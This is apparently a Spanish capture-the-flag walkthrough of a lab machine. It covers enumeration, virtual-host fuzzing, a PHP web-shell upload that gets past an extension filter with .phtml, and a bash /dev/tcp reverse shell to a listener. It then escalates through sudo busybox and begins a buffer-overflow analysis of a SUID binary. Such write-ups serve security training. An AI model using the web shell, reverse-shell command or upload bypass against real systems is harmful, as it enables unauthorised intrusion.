# Enumeracion de puertos ,servios y Versiones

```ruby
nmap -sSCV --min-rate 5000 -Pn -vvv 172.17.0.2 > nmap.txt 
shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 02:42:AC:11:00:02 (Unknown)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:19
Completed NSE at 17:19, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:19
Completed NSE at 17:19, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:19
Completed NSE at 17:19, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.58 seconds
           Raw packets sent: 1001 (44.028KB) | Rcvd: 1001 (40.032KB)
```

`nmap` nos indica que hay un solo puerto  y este es de el servicio (HTTP), por que irermos a mirar que hay en el.

<img width="1013" height="550" alt="image" src="https://github.com/user-attachments/assets/a8757169-49ff-4eb2-a73e-4a024fb2d8fc" />

Nos encontramos  un servicio apache mirando detalladamente vemos una ruta un tanto modificada, `/var/www/5eEk3r`. lo primero que haremos sera agregar la `IP` a nuestro `/etc/hosts/` con el nombre `5eEKr` como dominio 

De esta manera lo agregaremos y volveremos a visitar el dominio  si algo cambia..

```ruby
echo '172.17.0.2 5eEk3r.dl' >> /etc/hosts
```

volviendo a servicio web nuevamente nos encontraremos lo mismo, nos dispondremos a realizarle un fuzzing Web con la herramienta que prefieran, en mi caso usare feroxbuster

```ruby
feroxbuster -u http://5eek3r.dl/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x txt,php,bak,db,py,html,js,jpg,png,git,sh -t 200 --random-agent --no-state -d 5

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://5eek3r.dl/
 🚩  In-Scope Url          │ 5eek3r.dl
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ [200, 301, 302]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php, bak, db, py, html, js, jpg, png, git]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 5
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      368l      933w    10705c http://5eek3r.dl/index.html
301      GET        9l       28w      311c http://5eek3r.dl/javascript => http://5eek3r.dl/javascript/
200      GET       25l      127w    10359c http://5eek3r.dl/icons/openlogo-75.png
200      GET      368l      933w    10705c http://5eek3r.dl/
[##>-----------------] - 85s   465261/4567915 13m     found:4       errors:0      
[##>-----------------] - 85s   255585/2283919 3017/s  http://5eek3r.dl/ 
[#>------------------] - 83s   206998/2283919 2506/s  http://5eek3r.dl/javascript/                                                                                                                                                          ^C

```

En este resultado no vemos directorios con algo importante asi que haremos una busqueda de subdominos con wfuzz 

```ruby
wfuzz -H "Host: FUZZ.5eEk3r.dl" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 200 -u http://5eek3r.dl/

wfuzz -H "Host: FUZZ.5eEk3r.dl" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 200 -u http://5eek3r.dl/ --hh=10705
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://5eek3r.dl/
Total requests: 114442

=====================================================================
ID           Response   Lines    Word       Chars       Payload     
=====================================================================

000009532:   400        10 L     35 W       301 Ch      "#www"      
000010581:   400        10 L     35 W       301 Ch      "#mail"     
000042993:   200        101 L    75 W       932 Ch      "crosswords"
000047706:   400        10 L     35 W       301 Ch      "#smtp"     
000103135:   400        10 L     35 W       301 Ch      "#pop3"     

Total time: 91.38973
Processed Requests: 114442
Filtered Requests: 114437
Requests/sec.: 1252.241
```

este proceso nos da varios resultados, pero hay uno que nos llamara mas la atencion `crosswords` lo agregaremos al `/etc/hosts` de esta manera 
```ruby
172.17.0.2   5eEk3r.dl crosswords.5eEk3r.dl
```
accederemos al subdominio y veremos lo siguiente

<img width="848" height="461" alt="image" src="https://github.com/user-attachments/assets/10bf2a3d-18ae-443f-a56d-706bdc5df109" />


nos  consegiremos una web que codifica el texto que le pasemos sustituyendo cada letra por la siguiente en el puerto 14, inspeccionando la web me consigo con un comentario.

<img width="845" height="431" alt="image" src="https://github.com/user-attachments/assets/2f7f4122-803f-4ca2-97b5-4a08b5e79986" />

En un principio intentar explotar un `xss` no tiene mucho sentido si el objetivo es intentar acceder al servidor por lo que continuo sin hacer caso al comentario del `xss`. Esta web no parece tener nada mas asi que continuo buscando subdominios en vista de que no tengo nada mas que intentar,seguriremos buscando subdominios

```ruby
wfuzz -H "Host: FUZZ.crosswords.5eEk3r.dl" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 200 -u http://5eek3r.dl --hh=10705

wfuzz -H "Host: FUZZ.crosswords.5eEk3r.dl" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 200 -u http://5eek3r.dl --hh=10705
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://5eek3r.dl/
Total requests: 114442

=====================================================================
ID           Response   Lines    Word       Chars       Payload     
=====================================================================

000000024:   200        109 L    197 W      3156 Ch     "admin"     
000009532:   400        10 L     35 W       301 Ch      "#www"      
000010581:   400        10 L     35 W       301 Ch      "#mail"     
000047706:   400        10 L     35 W       301 Ch      "#smtp"     
000092040:   200        368 L    933 W      10705 Ch    "eigonokai-j
Total time: 0
Processed Requests: 92034
Filtered Requests: 92030
Requests/sec.: 0
```
optendremos el subdominio `admin` y realizo el mismo  procedimiento en `/etc/hosts` y agrego `admin` quedando de la siguente manera
```ruby
172.17.0.2   5eEk3r.dl crosswords.5eEk3r.dl admin.crosswords.5eEk3r.dl
```
iremos alsubdominio 

<img width="857" height="421" alt="image" src="https://github.com/user-attachments/assets/5c90a8c2-a03c-4fa5-a353-56b3c7476811" />

damos con un administrador de archivos donde es posible eliminar asi como cargar archivos y por lo visto la web interpreta `php` ya que observo un `index.php`, por tal motivo procedo con la carga de un archivo `php` malicioso
```ruby
<?php
	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```
cargamos el archivo malicioso y me arroja el siguiente mensaje

<img width="857" height="418" alt="image" src="https://github.com/user-attachments/assets/157faf63-0217-403b-98d4-628a524f9e13" />

No es posible cargar un archivo php directamente pero existen formas, primero intente el bypass modificando la peticion en el Content-Type pero el servidor no esta validando esto sino la extension del archivo por lo que tras ir testeando diferentes extensiones logre dar con la que es posible cargar y sobre todo la extension que es interpretada como php por el servidor.

<img width="859" height="422" alt="image" src="https://github.com/user-attachments/assets/84298d90-ac12-434c-ae2a-a4a5fb2d0cdb" />

como se veremos, la extension es phtml nos permite ejecutar comandos, asi que ya cargado el archivo malicioso procedo a obtener la revershell
```ruby
http://crosswords.5eek3r.dl/shell.phtml?cmd=whoami
```
viendo esto haremos un revershell, nos pondremos ala escucha con nc 
```ruby
nc -nlvp 443
``` 
podremos esto en la url 
```
http://crosswords.5eek3r.dl/shell.phtml?cmd=bash%20-c%20%27exec%20bash%20-i%20%26%3E/dev/tcp/172.17.0.1/443%20%3C%261%27
```
con esto entraremos con el usuario `www-data`

con esta informacion  listaremos los permisos de usuario

sudo -l
```ryby
User www-data may run the following commands on dockerlabs:
    (astu : astu) NOPASSWD: /usr/bin/busybox # Binario potencial
```

Sabiendo que solo son dos usuarios haremos lo siguiente.
```ruby
cat /etc/passwd | grep "sh"

root:x:0:0:root:/root:/bin/bash
astu:x:1000:1000:astu,,,:/home/astu:/bin/bash
```

Si intentamos ejecutar el bianario tenemos lo siguiente:

```ruby
sudo -u astu /usr/bin/busybox 
```

No retorna el modo de uso y los binarios que podemos ejecutar:

```ruby
Usage: busybox [function [arguments]...]
   or: busybox --list[-full]
   or: busybox --show SCRIPT
   or: busybox --install [-s] [DIR]
   or: function [arguments]...

 BusyBox is a multi-call binary that combines many common Unix
 utilities into a single executable.  Most people will create a
 link to busybox for each function they wish to use and BusyBox
 will act like whatever it was invoked as.

Currently defined functions:
 [, [[, acpid, adjtimex, ar, arch, arp, arping, ascii, ash, awk, base64, basename, bc, blkdiscard, blkid, blockdev, brctl, bunzip2, bzcat, bzip2, cal, cat, chgrp, chmod, chown, chroot, chvt, clear, cmp, cp, cpio, crc32, cttyhack, cut, date, dc, dd, deallocvt,
 depmod, devmem, df, diff, dirname, dmesg, dnsdomainname, dos2unix, du, dumpkmap, dumpleases, echo, egrep, env, expand, expr, factor, fallocate, false, fatattr, fdisk, fgrep, find, findfs, fold, free, freeramdisk, fsfreeze, fstrim, ftpget, ftpput, getopt, getty,
 grep, groups, gunzip, gzip, halt, head, hexdump, hostid, hostname, httpd, hwclock, i2cdetect, i2cdump, i2cget, i2cset, i2ctransfer, id, ifconfig, ifdown, ifup, init, insmod, ionice, ip, ipcalc, ipneigh, kill, killall, klogd, last, less, link, linux32, linux64,
 linuxrc, ln, loadfont, loadkmap, logger, login, logname, logread, losetup, ls, lsmod, lsscsi, lzcat, lzma, lzop, md5sum, mdev, microcom, mim, mkdir, mkdosfs, mke2fs, mkfifo, mknod, mkpasswd, mkswap, mktemp, modinfo, modprobe, more, mount, mt, mv, nameif, nc,
 netstat, nl, nologin, nproc, nsenter, nslookup, nuke, od, openvt, partprobe, paste, patch, pidof, ping, ping6, pivot_root, poweroff, printf, ps, pwd, rdate, readlink, realpath, reboot, renice, reset, resume, rev, rm, rmdir, rmmod, route, rpm, rpm2cpio,
 run-init, run-parts, sed, seq, setkeycodes, setpriv, setsid, sh, sha1sum, sha256sum, sha3sum, sha512sum, shred, shuf, sleep, sort, ssl_client, start-stop-daemon, stat, strings, stty, svc, svok, swapoff, swapon, switch_root, sync, sysctl, syslogd, tac, tail,
 tar, taskset, tee, telnet, test, tftp, time, timeout, top, touch, tr, traceroute, traceroute6, true, truncate, ts, tty, ubirename, udhcpc, udhcpd, uevent, umount, uname, uncompress, unexpand, uniq, unix2dos, unlink, unlzma, unshare, unxz, unzip, uptime, usleep,
 uudecode, uuencode, vconfig, vi, w, watch, watchdog, wc, wget, which, who, whoami, xargs, xxd, xz, xzcat, yes, zcat
```
con esta informacion migraremos al usuario
```
sudo -u astu /usr/bin/busybox sh
```

ahora como usuario `astu` haremos un listado de permisos SUID

```ruby
find / -perm -4000 2>/dev/null
```
Tenemos un binario intenresante 
```
/home/astu/secure/bs64
```
Si ejecutamos el binario tenemos que nos devuelve una cadena en base64
```ruby
/bs64
Ingrese el texto: hola

aG9YS=
```

Ahora probaremos si es vulnerable `BufferOverFlow` para determinar esto usaremos python3 para crear 200 letras A
```ruby
python3 -c 'print("A"*200)'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
con esto comprobamos que es vulnerable a BufferOverFlow
```ruby
Ingrese el texto: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
QUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQU=

Segmentation fault
```
Ahora desde la maquina victima montamos un servidor python3 para descargarnos el binario a nuestro equipo de atacante:

```ruby
python3 -m http.server 8080
```
Realizamos la peticion:
```ruby
wget http://172.17.0.2:8080/bs64
```
Daremos permisos de ejecucion a el binario 
```ruby
chmod +x bs64
```
 # BufferOverFlow
 Lanzamos el binario con la herramienta
 ```ruby
gdb ./bs64
```

ejecutaremos la aplicacion 

```ruby
pwndbg> run
```

Ahora crearemos un cadena de 400 caracteres para aplicar el desbordamiento de buffer
```ruby
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 400

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
```

Se ejecutara el programa, Y nos pedira que ingresemos un texto
```ruby
Ingrese el texto: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
```
veremos lo siguiente
```ruby
Program received signal SIGSEGV, Segmentation fault.
0x00000000004013d8 in main ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]
 RAX  0
 RBX  0x7fffffffdd88 ◂— '4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A'
 RCX  0
 RDX  0
 RDI  0x7ffff7f987b0 (_IO_stdfile_1_lock) ◂— 0
 RSI  0x4052a0 ◂— 0x5751455751455751 ('QWEQWEQW')
 R8   0
 R9   0
 R10  0
 R11  0x202
 R12  0
 R13  0x7fffffffdd98 ◂— 'Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A'
 R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe310 ◂— 0
 R15  0x403df0 —▸ 0x401130 ◂— endbr64 
 RBP  0x3363413263413163 ('c1Ac2Ac3')
 RSP  0x7fffffffdc78 ◂— 0x6341356341346341 ('Ac4Ac5Ac')
 RIP  0x4013d8 (main+58) ◂— ret 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────
 ► 0x4013d8 <main+58>    ret                                <0x6341356341346341>
    ↓


──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────
00:0000│ rsp 0x7fffffffdc78 ◂— 0x6341356341346341 ('Ac4Ac5Ac')
01:0008│     0x7fffffffdc80 ◂— 0x4138634137634136 ('6Ac7Ac8A')
02:0010│     0x7fffffffdc88 ◂— 0x3164413064413963 ('c9Ad0Ad1')
03:0018│     0x7fffffffdc90 ◂— 0x6441336441326441 ('Ad2Ad3Ad')
04:0020│     0x7fffffffdc98 ◂— 0x4136644135644134 ('4Ad5Ad6A')
05:0028│     0x7fffffffdca0 ◂— 0x3964413864413764 ('d7Ad8Ad9')
06:0030│     0x7fffffffdca8 ◂— 0x6541316541306541 ('Ae0Ae1Ae')
07:0038│     0x7fffffffdcb0 ◂— 0x4134654133654132 ('2Ae3Ae4A')
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────
 ► 0         0x4013d8 main+58
   1 0x6341356341346341 None
   2 0x4138634137634136 None
   3 0x3164413064413963 None
   4 0x6441336441326441 None
   5 0x4136644135644134 None
   6 0x3964413864413764 None
   7 0x6541316541306541 None
```

Vemos que el ret tiene este valor ``0x6341356341346341``

Ahora toca sacar el valor de offset en dicha direccion: Tenemos que el valor del offset es el 72
```ruby
 /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x6341356341346341
[*] Exact match at offset 72
```
La salida de checksec te da un desglose de las protecciones de seguridad que están activas en el binario.

    File: Es el nombre del archivo binario que estás analizando (bs64).
    Arch: La arquitectura del binario es amd64 (es decir, 64 bits).

RELRO es una protección de seguridad que ayuda a evitar ciertos tipos de ataques, como la escritura en las direcciones de memoria que deberían ser solo de lectura.

    Partial RELRO: El binario tiene protección parcial. Esto significa que se protege solo una parte de las secciones de memoria, pero no todo. No es la forma más segura, pero es algo mejor que no tener RELRO en absoluto. El Full RELRO proporciona una protección más fuerte contra ciertos ataques de escritura en memoria.

El canary es una técnica que ayuda a prevenir desbordamientos de buffer al insertar un valor secreto antes de la dirección de retorno en la pila. Si un atacante intenta sobrescribir la dirección de retorno, el canario cambiará, lo que provoca que el programa termine (o se comporte de manera inesperada). No canary found: El binario no tiene protección de canario. Esto hace que sea más vulnerable a ataques de desbordamiento de buffer, ya que no se está protegiendo explícitamente la pila.

NX (No eXecute) es una protección que asegura que ciertas áreas de la memoria (como la pila) no se pueden ejecutar como código. Esto evita que los atacantes ejecuten código arbitrario en la pila, como lo harían en un ataque de buffer overflow.

    NX enabled: NX está habilitado, lo que significa que la pila y otras regiones de la memoria no pueden ser ejecutadas, haciendo que ciertos tipos de explotación, como la ejecución de código malicioso desde la pila, sean más difíciles.

PIE (Position Independent Executable) es una característica que hace que el binario sea más difícil de predecir. Cuando PIE está habilitado, el binario se carga en direcciones aleatorias de la memoria cada vez que se ejecuta, lo que hace que la explotación de vulnerabilidades sea más difícil.

    No PIE: No está habilitado PIE, lo que significa que el binario se carga en una dirección fija (en este caso, 0x400000). Esto hace que sea más fácil para un atacante predecir la ubicación de funciones y otros componentes importantes en la memoria.

Los binarios "stripped" son aquellos a los que se les han eliminado los símbolos de depuración (como nombres de funciones y variables). Esto hace que el binario sea más difícil de analizar y explotar porque se pierde información útil.

    No: El binario no está despojado de símbolos, lo que significa que tiene información de depuración (por ejemplo, nombres de funciones). Esto puede ser útil para la explotación y el análisis.
